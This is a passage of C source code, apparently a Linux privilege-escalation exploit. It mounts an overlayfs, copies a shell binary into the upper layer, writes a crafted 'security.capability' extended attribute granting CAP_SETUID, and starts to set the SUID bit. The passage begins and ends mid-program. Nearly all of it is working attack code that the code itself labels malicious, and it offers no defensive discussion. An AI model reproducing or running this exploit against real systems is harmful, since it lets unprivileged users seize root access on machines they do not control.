    if (mount("overlay", DIR_MERGE, "overlay", 0, mount_opts) != 0) {
        cleanup_and_exit("[-] Failed to mount overlayfs");
    }

    // 4. Copy a binary to the upper directory to modify its capabilities
    printf("[*] Copying %s to %s...\n", SU_SHELL_PATH, EXE_PATH);
    char command[256];
    snprintf(command, sizeof(command), "cp %s %s", SU_SHELL_PATH, EXE_PATH);
    if (system(command) != 0) {
        cleanup_and_exit("[-] Failed to copy binary");
    }

    // 5. Craft and set the malicious 'security.capability' xattr
    printf("[*] Setting 'security.capability' xattr to grant CAP_SETUID...\n");
    struct vfs_cap_data cap_data = {0};
    cap_data.magic_etc = 0x01000000; // VFS_CAP_REVISION_2
    cap_data.data[0].permitted = (1 << 7); // Set CAP_SETUID bit
    cap_data.data[0].inheritable = (1 << 7);

    if (setxattr(EXE_PATH, "security.capability", &cap_data, sizeof(cap_data), 0) != 0) {
        cleanup_and_exit("[-] Failed to set extended attribute");
    }

    // 6. Set the SUID bit on the file
    printf("[*] Setting SUID bit on %s...\n", EXE_PATH);
